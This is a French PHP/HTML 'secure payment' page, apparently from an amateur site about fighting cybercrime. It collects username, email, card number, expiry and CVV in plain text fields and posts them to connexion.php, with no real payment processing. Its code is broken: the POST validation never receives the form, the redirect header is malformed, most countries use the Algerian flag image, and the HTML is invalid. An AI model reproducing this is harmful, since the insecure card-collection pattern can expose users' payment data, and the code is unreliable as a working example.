<?php
// Liste des pays d'Afrique avec leurs codes ISO et chemins d'accès aux drapeaux
$africanCountries = array(
    'DZ' => array('name' => 'Algérie', 'flag' => 'flags/dz.png'),
    'AO' => array('name' => 'Angola', 'flag' => 'flags/ao.png'),
    'BJ' => array('name' => 'Bénin', 'flag' => 'flags/bj.png'),
        'BW' => array('name' =>'Botswana','flag' => 'flags/bw.png'),
        'BF' => array('name' =>'Burkina Faso','flag' => 'flags/bf.png'),
        'BI' => array('name' =>'Burundi','flag' => 'flags/bi.png'),
        'CM' => array('name' =>'Cameroun','flag' => 'flags/cm.png'),
        'CV' => array('name' =>'Cap-Vert','flag' => 'flags/cv.png'),
        'CF' => array('name' =>'République centrafricaine','flag' => 'flags/cf.png'),
        'TD' => array('name' =>'Tchad','flag' => 'flags/td.png'),
        'KM' => array('name' =>'Comores','flag' => 'flags/km.png'),
        'CG' => array('name' =>'République du Congo','flag' => 'flags/cg.png'),
        'CD' => array('name' =>'République démocratique du Congo','flag' => 'flags/cd.png'),
        'CI' => array('name' =>'Côte d\'Ivoire','flag' => 'flags/ci.png'),
        'DJ' => array('name' =>'Djibouti','flag' => 'flags/dj.png'),
        'EG' => array('name' =>'Égypte','flag' => 'flags/eg.png'),
        'GQ' => array('name' =>'Guinée équatoriale','flag' => 'flags/dz.png'),
        'ER' => array('name' =>'Érythrée','flag' => 'flags/dz.png'),
        'ET' => array('name' =>'Éthiopie','flag' => 'flags/dz.png'),
        'GA' => array('name' =>'Gabon','flag' => 'flags/dz.png'),
        'GM' => array('name' =>'Gambie','flag' => 'flags/dz.png'),
        'GH' => array('name' =>'Ghana','flag' => 'flags/dz.png'),
        'GN' => array('name' =>'Guinée','flag' => 'flags/dz.png'),
        'GW' => array('name' =>'Guinée-Bissau','flag' => 'flags/dz.png'),
        'KE' => array('name' =>'Kenya','flag' => 'flags/dz.png'),
        'LS' => array('name' =>'Lesotho','flag' => 'flags/dz.png'),
        'LR' => array('name' =>'Libéria','flag' => 'flags/dz.png'),
        'LY' => array('name' =>'Libye','flag' => 'flags/dz.png'),
        'MG' => array('name' =>'Madagascar','flag' => 'flags/dz.png'),
        'MW' => array('name' =>'Malawi','flag' => 'flags/dz.png'),
        'ML' => array('name' =>'Mali','flag' => 'flags/dz.png'),
        'MR' => array('name' =>'Mauritanie','flag' => 'flags/dz.png'),
        'MU' => array('name' =>'Maurice','flag' => 'flags/dz.png'),
        'MA' => array('name' =>'Maroc','flag' => 'flags/dz.png'),
        'MZ' => array('name' =>'Mozambique','flag' => 'flags/dz.png'),
        'NA' => array('name' =>'Namibie','flag' => 'flags/dz.png'),
        'NE' => array('name' =>'Niger','flag' => 'flags/dz.png'),
        'NG' => array('name' =>'Nigéria','flag' => 'flags/dz.png'),
        'RW' => array('name' =>'Rwanda','flag' => 'flags/dz.png'),
        'ST' => array('name' =>'Sao Tomé-et-Principe','flag' => 'flags/dz.png'),
        'SN' => array('name' =>'Sénégal','flag' => 'flags/dz.png'),
        'SC' => array('name' =>'Seychelles','flag' => 'flags/dz.png'),
        'SL' => array('name' =>'Sierra Leone','flag' => 'flags/dz.png'),
        'SO' => array('name' =>'Somalie','flag' => 'flags/dz.png'),
        'ZA' => array('name' =>'Afrique du Sud','flag' => 'flags/dz.png'),
        'SS' => array('name' =>'Soudan du Sud','flag' => 'flags/dz.png'),
        'SD' => array('name' =>'Soudan','flag' => 'flags/dz.png'),
        'SZ' => array('name' =>'Eswatini','flag' => 'flags/dz.png'),
        'TZ' => array('name' =>'Tanzanie','flag' => 'flags/dz.png'),
        'TG' => array('name' =>'Togo','flag' => 'flags/dz.png'),
        'TN' => array('name' =>'Tunisie','flag' => 'flags/dz.png'),
        'UG' => array('name' =>'Ouganda','flag' => 'flags/dz.png'),
        'EH' => array('name' =>'Sahara occidental','flag' => 'flags/dz.png'),
        'ZM' => array('name' =>'Zambie','flag' => 'flags/dz.png'),
        'ZW' => array('name' =>'Zimbabwe','flag' => 'flags/dz.png'),
    
    // Ajoutez ici les autres pays d'Afrique avec leurs drapeaux
    // Exemple : 'Code_ISO' => array('name' => 'Nom du pays', 'flag' => 'chemin_vers_le_drapeau.png')
);

// Vérification des données de paiement
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $genre = $_POST['genre'];
    $age = $_POST['age'];
    $pays = $_POST['pays'];
    $telephone = $_POST['telephone'];
    
    // Validation des données (vous pouvez ajouter vos propres validations ici)
    if (empty($genre) || empty($age) || empty($pays) || empty($telephone)) {
        // Afficher un message d'erreur si des champs obligatoires sont manquants
        $error = "Veuillez remplir tous les champs obligatoires.";
    } else {
        // Continuer le processus de paiement sécurisé
        // Intégrer avec votre passerelle de paiement préférée
        
        // ... Code de traitement du paiement ...
        
        // Redirection vers une page de confirmation ou de remerciement
        header("Location :important.php");
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Paiement sécurisé</title>
    <link rel="stylesheet" href="..css/style4.css">
    <link rel="shortcut icon" href="../image/image1.png" type="image1/x-con">
    </style>
</head>
<body>

<header>
  <div class="image1">
    <img src="../image/image1.png" with="100%" alt="image1">
  </div>
  <nav>
    <ul>
      <li><button class="cn"><a href="Accueil.php">Accueil</a></button></li>
     <li><button class="cn"><a href="contact.php">contact</a></button></li>
      <li><button class="cn"><a href="service.php">service</a></button></li>
      <li><button class="cn"><a href="signalement.php">Signalement</a></button></li>
      <li><button class="cn"><a href="login.php">Se connecter</a></button></li>
     
    </ul>
  </nav>
</header>
    <fieldset><legend>
    <h2>Paiement sécurisé</h2></legend>
    
    <?php if (isset($error)) { ?>
        <div class="error"><?php echo $error; ?></div>
    <?php } ?>
    
    <form action="connexion.php" method="POST">
         <p>veuillez remplir les informations suivantes pour procéder au paiement :</p>
           <label for="txt">Username :</label><br><br>
        <input type="txt" id="username" name="username" required>
          <label for="email">Email :</label><br><br>
        <input type="email" id="email" name="email" required>
        
        <label for="carte">Numéro de carte de crédit :</label><br><br>
        <input type="text" id="carte" name="carte" required>
        
        <label for="expiration">Date d'expiration :</label><br><br>
        <input type="text" id="expiration" name="expiration" required>
        
        <label for="cvv">CVV :</label><br><br>
        <input type="text" id="cvv" name="cvv" required>
        <label for="genre">Genre :</label><br><br>
        <select id="genre" name="genre" required>
            <option value="homme">Homme</option>
            <option value="femme">Femme</option>
        </select>
        
        <label for="age">Âge :</label><br><br>
        <select id="age" name="age" required>
            <option value="18-25">18-25</option>
            <option value="26-35">26-35</option>
            <option value="36+">36+</option>
        </select>
        <option value="" disabled selected>Sélectionnez votre pays</option>
        <select id="pays" name="pays" required>
            <?php foreach ($africanCountries as $code => $country) { ?>
                <option value="<?php echo $code; ?>">
                    <img class="flag-img" src="<?php echo $country['flag']; ?>" alt="<?php echo $country['name']; ?> Flag"><br><br>
                    <?php echo $country['name']; ?>
                </option>
            <?php } ?>
        </select>
        <button type="submit">Payer</button><br><br>
    </form>
    </fieldset>
    <footer>
        <p>&copy; 2024 Repression de la Cybercriminalite. Tous droits réservés.</p>
    </footer>
</body>
</html>